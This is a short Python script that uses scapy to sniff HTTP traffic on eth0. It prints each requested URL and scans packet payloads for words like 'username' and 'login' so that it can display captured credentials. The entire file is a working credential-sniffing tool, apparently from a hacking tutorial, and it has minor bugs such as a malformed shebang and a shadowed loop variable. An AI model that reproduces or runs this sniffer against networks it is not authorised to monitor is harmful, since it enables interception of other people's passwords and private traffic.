#!usr/bin/env python
import scapy.all as scapy
from scapy.layers import http


# scapy.sniff attribute , filter="udp"
# arp,tcp
# port 21 for ftp <- captures data from that one port


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "email", "login", "user"]
        for keywords in keywords:
            if keywords in load:
                return load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> "+url)

        login_info = get_login(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")



sniff("eth0")
